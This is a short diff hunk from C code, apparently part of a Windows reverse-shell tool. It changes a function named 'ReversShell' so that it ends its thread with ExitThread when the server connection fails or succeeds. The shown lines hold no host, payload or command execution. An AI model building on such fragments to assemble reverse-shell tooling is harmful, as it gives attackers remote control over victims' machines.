@@ -8,10 +8,10 @@ BOOL ReversShell()
     if (WS_Connection() == FALSE)
     {
         printf("Failed to initiate connection with the server\n");
-        return FALSE;
+        ExitThread(EXIT_FAILURE);
     }
     
-    return TRUE;
+    ExitThread(EXIT_SUCCESS);
 }
 
 EXTERN_C_END
